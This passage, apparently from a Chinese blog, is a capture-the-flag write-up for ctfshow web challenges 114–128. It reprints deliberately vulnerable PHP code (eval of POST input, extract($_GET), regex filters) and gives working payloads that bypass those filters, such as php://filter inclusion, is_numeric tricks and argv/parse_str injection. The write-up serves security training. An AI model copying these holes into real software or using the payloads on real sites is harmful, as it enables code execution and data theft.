class="line"><span class="comment"> Last Modified time: 2020-10-01 15:02:53</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; 师傅们居然tql都是非预期 哼！</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408201931367.png" alt="image-20220408201931367"></p><h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="trim函数与is-numeric函数"><a href="#trim函数与is-numeric函数" class="headerlink" title="trim函数与is_numeric函数"></a>trim函数与is_numeric函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">参数描述</span><br><span class="line">string        必需。规定要检查的字符串。</span><br><span class="line">charlist    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class="line"></span><br><span class="line">&quot;\0&quot;       - NULL</span><br><span class="line">&quot;\t&quot;       - 制表符</span><br><span class="line">&quot;\n&quot;       - 换行</span><br><span class="line">&quot;\x0B&quot;     - 垂直制表符</span><br><span class="line">&quot;\r&quot;       - 回车</span><br><span class="line">&quot; &quot;        - 空格</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;<span class="number">128</span> ; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>)==<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#除了+-.还有%09 %0a %0b %0c %0d %20</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#除了+-.号以外还有只剩下%0c也就是换页符了</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408202056601.png" alt="image-20220408202056601"></p><h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的isset($_POST[‘CTF_SHOW.COM’])因为php变量命名是不允许使用点号的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_POST);</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408151831345.png" alt="image-20220408151831345"></p><p>PHP1.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>req.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_POST,<span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_POSTFIELDS,<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$respose</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$respose</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1:80/PHP1.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">128</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;= <span class="number">128</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="string">&quot;CTF&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;SHOW&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>)).<span class="string">&quot;COM&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>,<span class="variable">$data</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#输出CTF%5BSHOW.COM=123</span></span><br></pre></td></tr></table></figure><ul><li><p>cli模式(命令行)下</p><p>  第一个参数<code>$_SERVER[&#39;argv&#39;</code>][0]是脚本名,其余的是传递给脚本的参数</p></li><li><p>web网页模式下</p><p>  在web页面模式下必须在php.ini开启register_argc_argv配置项,设置register_argc_argv &#x3D; On(默认是off),重启服务,$_SERVER[‘argv’]才会有效果,这个时候的<code>$_SERVER[&#39;argv&#39;][0]</code> &#x3D; $_SERVER[‘QUERY_STRING’],$argv在web模式下不适用</p></li></ul><p>因为我们是在网页模式下运行的,所以<code>$_SERVER[&#39;agrv&#39;][0]</code>&#x3D;<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>也就是<code>$a[0] = $_SERVER[&#39;QUERY_STRING&#39;]</code>,这个时候我们只要通过eval(“$c”.”;”);将$flag赋值flag_give_me就可以了.</p><p>也就是a[‘$flg’] &#x3D; flag_give_me</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?$fl0g=flag_give_me; </span><br><span class="line">POST</span><br><span class="line">CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</span><br><span class="line">POST</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS)   题目出不来，本地测试可以</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=1+fl0g=flag_give_me</span><br><span class="line">POST</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure><p>有大佬<a href="https://www.kdocs.cn/l/suP9eF7AuD1S?f=201">啃了下php的c源码</a>总结如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去</span><br><span class="line">继续判断query string是否为空，</span><br><span class="line">如果不为空把通过+符号分割的字符串转换成php内部的zend_string，</span><br><span class="line">然后再把这个zend_string复制到 arr 数组中去。</span><br></pre></td></tr></table></figure><p>这样就可以通过加号+分割argv成多个部分，正如我们上面测试的结果。</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408202249395.png" alt="image-20220408202249395"></p><h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?$fl0g=flag_give_me; </span><br><span class="line">POST</span><br><span class="line">CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=1+fl0g=flag_give_me</span><br><span class="line">POST</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure><h1 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?$fl0g=flag_give_me; </span><br><span class="line">POST</span><br><span class="line">CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=1+fl0g=flag_give_me</span><br><span class="line">POST</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-10 21:52:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>req.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&quot;http://localhost:80/PHP1.php?ctf&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;show=1&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PHP1.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf_show&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ _ [ .  </span><br><span class="line">+  这里的加号在url中起到空格的作用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctf show=ilove36d</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408202623125.png" alt="image-20220408202623125"></p><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; 